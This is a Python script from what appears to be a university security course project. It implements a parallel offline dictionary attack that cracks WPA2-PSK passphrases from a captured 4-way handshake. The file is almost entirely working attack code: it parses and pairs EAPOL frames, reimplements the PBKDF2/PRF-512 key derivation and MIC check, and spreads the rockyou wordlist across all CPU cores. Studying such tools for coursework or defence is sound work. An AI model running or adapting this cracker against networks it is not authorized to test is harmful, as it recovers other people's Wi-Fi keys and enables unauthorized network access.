#!/usr/bin/env python3
"""
crack_fast.py -- CSE 406 Project (Topic 20) -- Group member: <NAME 2>

Parallel offline dictionary attack on a captured WPA2-PSK 4-way handshake.

Same crypto as crack.py (PMK -> PTK -> MIC), but with TWO fixes/upgrades:
  1. CORRECTNESS: a capture usually holds several handshake attempts. We pair
     msg1 (ANonce) with msg2 (SNonce + MIC) by their shared Key Replay Counter,
     so the nonces always come from the SAME exchange. (The old "last frame
     wins" approach could mix nonces from different attempts -> MIC never
     matches, even for the right password.)
  2. SPEED: we spread the wordlist across ALL CPU cores with multiprocessing.

    sudo python3 crack_fast.py handshake-starwars1.cap
"""

import sys
import time
import hmac
import hashlib
from multiprocessing import Pool, cpu_count
from scapy.all import rdpcap, EAPOL

# ---- configuration ----------------------------------------------------
ESSID    = "wifi-mobile"                                  # PBKDF2 salt
WORDLIST = "/root/tools/eaphammer/wordlists/rockyou.txt"
CHUNK    = 5000            # passwords handed to a worker at a time
# -----------------------------------------------------------------------


# ===========================================================================
# 1. PARSE + PAIR THE HANDSHAKE(S)
# ===========================================================================
def mac_to_bytes(mac):
    return bytes(int(b, 16) for b in mac.split(":"))

def key_info(b):
    return (b[5] << 8) | b[6]           # Key Information field (bytes 5..6)

def replay_counter(b):
    return b[9:17]                      # Key Replay Counter (bytes 9..16)

def parse_handshakes(capfile):
    """Return a list of complete, correctly-paired handshake exchanges."""
    packets = rdpcap(capfile)
    msg1 = {}   # replay_counter -> (anonce, ap_mac, client_mac)
    msg2 = {}   # replay_counter -> (snonce, mic, eapol, version, ap, client)

    for pkt in packets:
        if not pkt.haslayer(EAPOL):
            continue
        raw   = bytes(pkt[EAPOL])
        ki    = key_info(raw)
        rc    = replay_counter(raw)
        nonce = raw[17:49]              # Key Nonce (bytes 17..48)

        if (ki & 0x0080) and not (ki & 0x0100):
            # msg 1: ACK set, MIC not set  ->  AP -> client, carries ANonce
            msg1[rc] = (nonce,
                        mac_to_bytes(pkt.addr2),   # transmitter = AP
                        mac_to_bytes(pkt.addr1))   # receiver    = client
        elif (ki & 0x0100) and not (ki & 0x0080):
            # msg 2: MIC set, ACK not set  ->  client -> AP, carries SNonce+MIC
            mic     = raw[81:97]                    # Key MIC (bytes 81..96)
            eapol   = raw[:81] + (b"\x00" * 16) + raw[97:]   # MIC field zeroed
            version = ki & 0x0007
            msg2[rc] = (nonce, mic, eapol, version,
                        mac_to_bytes(pkt.addr1),   # receiver    = AP
                        mac_to_bytes(pkt.addr2))   # transmitter = client

    # pair msg1 and msg2 that share a replay counter = same exchange
    tuples = []
    for rc, (snonce, mic, eapol, version, ap, client) in msg2.items():
        if rc in msg1:
            anonce, ap1, client1 = msg1[rc]
            tuples.append({
                "anonce": anonce, "snonce": snonce, "mic": mic,
                "eapol": eapol, "version": version,
                "ap": ap1, "client": client1,
            })

    if not tuples:
        sys.exit("[-] No matched msg1+msg2 pair found (need same replay counter).")
    return tuples


# ===========================================================================
# 2. WPA2 KEY DERIVATION (identical maths to crack.py)
# ===========================================================================
def compute_mic(passphrase, hs):
    pmk = hashlib.pbkdf2_hmac("sha1", passphrase.encode(),
                              ESSID.encode(), 4096, 32)
    ap, cl = hs["ap"], hs["client"]
    an, sn = hs["anonce"], hs["snonce"]
    data = min(ap, cl) + max(ap, cl) + min(an, sn) + max(an, sn)

    # PRF-512 -> PTK, first 16 bytes are the KCK
    r, i = b"", 0
    while len(r) < 64:
        r += hmac.new(pmk,
                      b"Pairwise key expansion" + b"\x00" + data + bytes([i]),
                      hashlib.sha1).digest()
        i += 1
    kck = r[:16]

    if hs["version"] == 1:              # old WPA/TKIP
        return hmac.new(kck, hs["eapol"], hashlib.md5).digest()
    return hmac.new(kck, hs["eapol"], hashlib.sha1).digest()[:16]    # WPA2


# ===========================================================================
# 3. PARALLEL BRUTE FORCE
# ===========================================================================
_HS = None                             # per-worker copy of the handshake list

def _init(hs_tuples):
    """Runs once in each worker process; stashes the handshake(s) globally."""
    global _HS
    _HS = hs_tuples

def _check_chunk(words):
    """Test a chunk of candidate passwords; return the winner or None."""
    for w in words:
        w = w.strip()
        if not (8 <= len(w) <= 63):
            continue
        for hs in _HS:
            if compute_mic(w, hs) == hs["mic"]:
                return w
    return None

def wordlist_chunks(path, size):
    """Yield the wordlist in lists of `size` lines (keeps memory flat)."""
    buf = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            buf.append(line)
            if len(buf) >= size:
                yield buf
                buf = []
    if buf:
        yield buf


def main():
    if len(sys.argv) != 2:
        sys.exit(f"usage: sudo python3 {sys.argv[0]} <capture.cap>")
    capfile = sys.argv[1]

    hs_tuples = parse_handshakes(capfile)
    h0 = hs_tuples[0]
    print(f"[+] Complete handshake exchanges found : {len(hs_tuples)}")
    print(f"[+] AP  MAC     : {h0['ap'].hex(':')}")
    print(f"[+] Client MAC  : {h0['client'].hex(':')}")
    print(f"[+] Target MIC  : {h0['mic'].hex()}   (descriptor version {h0['version']})")

    ncores = cpu_count()
    print(f"[*] Cracking with {ncores} cores against ESSID '{ESSID}'...\n")

    start, tested, found = time.time(), 0, None
    with Pool(processes=ncores, initializer=_init, initargs=(hs_tuples,)) as pool:
        for result in pool.imap_unordered(_check_chunk,
                                          wordlist_chunks(WORDLIST, CHUNK)):
            tested += CHUNK
            if result:
                found = result
                pool.terminate()       # stop all workers immediately
                break
            if tested % (CHUNK * 10) == 0:
                rate = tested / (time.time() - start)
                print(f"    ~{tested:,} tried   ({rate:,.0f} pwd/s)")

    elapsed = time.time() - start
    if found:
        print(f"\n[+] KEY FOUND!  ->  {found}")
    else:
        print("\n[-] Password not found in wordlist.")
    print(f"[*] ~{tested:,} candidates in {elapsed:.1f}s "
          f"({tested / elapsed:,.0f} pwd/s across {ncores} cores)")


if __name__ == "__main__":
    main()
